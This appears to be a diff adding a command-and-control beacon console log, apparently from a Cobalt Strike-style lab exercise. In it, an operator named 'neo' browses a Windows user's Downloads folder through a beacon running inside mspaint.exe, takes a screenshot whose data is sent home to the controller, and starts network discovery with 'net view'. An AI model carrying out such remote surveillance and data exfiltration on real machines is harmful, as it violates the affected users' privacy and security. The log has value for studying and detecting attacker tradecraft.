@@ -1,0 +1,76 @@
+12/10 12:09:40 UTC [metadata] 172.22.53.18 <- 172.22.53.18; computer: ACER; user: david; process: mspaint.exe; pid: 12136; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/10 12:09:52 UTC [input] <neo> ls
+12/10 12:09:52 UTC [task] <> Tasked beacon to list files in .
+12/10 12:10:35 UTC [input] <neo> pwd
+12/10 12:10:35 UTC [task] <> Tasked beacon to print working directory
+12/10 12:10:36 UTC [checkin] host called home, sent: 27 bytes
+12/10 12:10:36 UTC [output]
+C:\Users\david\Downloads\testcap\*
+D	0	12/10/2022 19:05:38	.
+D	0	12/10/2022 18:19:27	..
+F	826584	11/04/2022 17:18:35	01_lecture.pdf
+F	927232	12/10/2022 19:05:29	a.exe
+F	926720	12/09/2022 12:59:11	notepad.exe
+F	5256	11/04/2022 17:24:39	pdf.ico
+F	8183	11/04/2022 17:01:09	pdf.png
+
+
+12/10 12:10:36 UTC [output]
+Current directory is C:\Users\david\Downloads\testcap
+
+12/10 12:10:46 UTC [input] <neo> ls
+12/10 12:10:46 UTC [task] <> Tasked beacon to list files in .
+12/10 12:10:52 UTC [input] <neo> ls -l
+12/10 12:10:52 UTC [task] <> Tasked beacon to list files in -l
+12/10 12:10:57 UTC [input] <neo> pwd
+12/10 12:10:57 UTC [task] <> Tasked beacon to print working directory
+12/10 12:11:10 UTC [input] <neo> 
+12/10 12:11:10 UTC [error] Unknown command: 
+12/10 12:11:21 UTC [input] <neo> cd ..
+12/10 12:11:21 UTC [task] <> cd ..
+12/10 12:11:26 UTC [input] <neo> ls
+12/10 12:11:26 UTC [task] <> Tasked beacon to list files in .
+12/10 12:11:34 UTC [input] <neo> pwd
+12/10 12:11:34 UTC [task] <> Tasked beacon to print working directory
+12/10 12:11:36 UTC [checkin] host called home, sent: 84 bytes
+12/10 12:11:36 UTC [output]
+C:\Users\david\Downloads\testcap\*
+D	0	12/10/2022 19:05:38	.
+D	0	12/10/2022 18:19:27	..
+F	826584	11/04/2022 17:18:35	01_lecture.pdf
+F	927232	12/10/2022 19:05:29	a.exe
+F	926720	12/09/2022 12:59:11	notepad.exe
+F	5256	11/04/2022 17:24:39	pdf.ico
+F	8183	11/04/2022 17:01:09	pdf.png
+
+
+12/10 12:11:36 UTC [error] could not open -l\*: 3
+12/10 12:11:36 UTC [output]
+Current directory is C:\Users\david\Downloads\testcap
+
+12/10 12:11:36 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/10/2022 18:19:27	.
+D	0	12/09/2022 20:11:23	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	3422194	12/10/2022 18:18:49	C1NE.03-Implement-and-testing.docx
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+F	346699	12/10/2022 18:16:39	HOAN THIEN_7.C2NE.03-Implement-IWH-HAP (1).pdf
+D	0	12/08/2022 10:19:33	Installed
+F	45042	12/10/2022 13:32:05	L?ch thi KTHP HK1 2022-2023 Tu?n 18-20 (d? ki?n).xlsx
+F	809947	12/09/2022 08:30:01	Outage_Probability_Minimization_in_Secure_NOMA_Cognitive_Radio_Systems_with_UAV_Relay_A_Machine_Learning_Approach.pdf
+D	0	12/10/2022 19:05:38	testcap
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/10 12:11:36 UTC [output]
+Current directory is C:\Users\david\Downloads
+
+12/10 12:11:58 UTC [input] <neo> screenshot
+12/10 12:11:58 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+12/10 12:12:36 UTC [checkin] host called home, sent: 199798 bytes
+12/10 12:13:40 UTC [input] <neo> net view
